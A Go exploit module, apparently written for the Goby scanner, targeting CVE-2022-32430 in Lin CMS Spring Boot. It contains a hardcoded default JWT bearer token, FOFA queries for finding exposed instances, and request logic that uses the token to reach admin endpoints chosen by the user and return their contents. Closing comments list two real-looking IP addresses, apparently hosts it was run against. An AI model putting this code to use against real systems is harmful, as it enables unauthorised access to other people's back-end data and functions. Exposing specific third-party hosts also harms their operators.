package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Lin CMS Spring Boot Default JWT (CVE-2022-32430)",
    "Description": "<p>Lin CMS Spring Boot is a SpringBoot-based CMS/DMS/management system development framework from the TaleLin team.</p><p>Lin CMS Spring Boot v0.2.1 version has security vulnerabilities, attackers can use the default JWT Token to access back-end information and functions within the application.</p>",
    "Product": "Lin CMS Spring Boot",
    "Homepage": "https://github.com/TaleLin/lin-cms-spring-boot",
    "DisclosureDate": "2022-07-22",
    "Author": "abszse",
    "FofaQuery": "body=\"font_1104271_so151lbumpq.js\"||title=\"lin-cms\" || body=\"心上无垢，林间有风\" ",
    "GobyQuery": "body=\"font_1104271_so151lbumpq.js\"||title=\"lin-cms\" || body=\"心上无垢，林间有风\" ",
    "Level": "2",
    "Impact": "<p>Lin CMS Spring Boot v0.2.1 version has security vulnerabilities, attackers can use the default JWT Token to access back-end information and functions within the application.</p>",
    "Recommendation": "<p>At present, the manufacturer has not released fixes to solve this security problem. It is recommended that users who use this software pay attention to the manufacturer's homepage or reference website for solutions: <a href=\"https://github.com/TaleLin/lin-cms-spring-boot\">https://github.com/TaleLin/lin-cms-spring-boot</a></p>",
    "References": [
        "https://www.mesec.cn/archives/277"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "interface,jwt",
            "show": ""
        },
        {
            "name": "uri",
            "type": "input",
            "value": "/cms/admin/group/all",
            "show": "attackType=interface"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/cms/admin/group/all",
                "follow_redirect": false,
                "header": {
                    "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZGVudGl0eSI6MSwic2NvcGUiOiJsaW4iLCJ0eXBlIjoiYWNjZXNzIiwiZXhwIjoxNzUzMTkzNDc5fQ.SesmAnYN5QaHqSqllCInH0kvsMya5vHA1qPHuwCZ8N8"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"id\":",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"name\":",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "{{{path}}}",
                "follow_redirect": false,
                "header": {
                    "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZGVudGl0eSI6MSwic2NvcGUiOiJsaW4iLCJ0eXBlIjoiYWNjZXNzIiwiZXhwIjoxNzUzMTkzNDc5fQ.SesmAnYN5QaHqSqllCInH0kvsMya5vHA1qPHuwCZ8N8"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(?s)(.*)"
            ]
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        "CVE-2022-32430"
    ],
    "CNNVD": [
        "CNNVD-202207-2172"
    ],
    "CNVD": [],
    "CVSSScore": "7.0",
    "Translation": {
        "CN": {
            "Name": "Lin CMS Spring Boot 默认 JWT 漏洞（CVE-2022-32430）",
            "Product": "Lin CMS Spring Boot",
            "Description": "<p>Lin CMS Spring Boot是林间有风（TaleLin）团队的一个基于 SpringBoot 的 CMS/DMS/管理系统开发框架。<br></p><p>Lin CMS Spring Boot v0.2.1 版本存在安全漏洞，攻击者利用默认的JWT Token可以访问应用程序内的后端信息和功能。<br></p>",
            "Recommendation": "<p>目前厂商暂未发布修复措施解决此安全问题，建议使用此软件的用户随时关注厂商主页或参考网址以获取解决办法：<a href=\"https://github.com/TaleLin/lin-cms-spring-boot\">https://github.com/TaleLin/lin-cms-spring-boot</a><br></p>",
            "Impact": "<p>Lin CMS Spring Boot v0.2.1 版本存在安全漏洞，攻击者利用默认的JWT Token可以访问应用程序内的后端信息和功能。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Lin CMS Spring Boot Default JWT (CVE-2022-32430)",
            "Product": "Lin CMS Spring Boot",
            "Description": "<p>Lin CMS Spring Boot is a SpringBoot-based CMS/DMS/management system development framework from the TaleLin team.<br></p><p>Lin CMS Spring Boot v0.2.1 version has security vulnerabilities, attackers can use the default JWT Token to access back-end information and functions within the application.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has not released fixes to solve this security problem. It is recommended that users who use this software pay attention to the manufacturer's homepage or reference website for solutions: <a href=\"https://github.com/TaleLin/lin-cms-spring-boot\">https://github.com/TaleLin/lin-cms-spring-boot</a><br></p>",
            "Impact": "<p>Lin CMS Spring Boot v0.2.1 version has security vulnerabilities, attackers can use the default JWT Token to access back-end information and functions within the application.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "jwt" {
				expResult.Success = true
				expResult.Output = `"Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZGVudGl0eSI6MSwic2NvcGUiOiJsaW4iLCJ0eXBlIjoiYWNjZXNzIiwiZXhwIjoxNzUzMTkzNDc5fQ.SesmAnYN5QaHqSqllCInH0kvsMya5vHA1qPHuwCZ8N8"`
				expResult.Output += "\n 注：请求时 Header 头附带以上信息"
			} else if attackType == "interface" {
				cfg := httpclient.NewGetRequestConfig(goutils.B2S(ss.Params["uri"]))
				cfg.VerifyTls = false
				cfg.FollowRedirect = false
				cfg.Header.Store("Authorization", "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZGVudGl0eSI6MSwic2NvcGUiOiJsaW4iLCJ0eXBlIjoiYWNjZXNzIiwiZXhwIjoxNzUzMTkzNDc5fQ.SesmAnYN5QaHqSqllCInH0kvsMya5vHA1qPHuwCZ8N8")
				rsp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else {
					expResult.Success = true
					expResult.Output = rsp.Utf8Html
				}
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}

//http://121.196.149.72:9000
//https://123.56.253.193
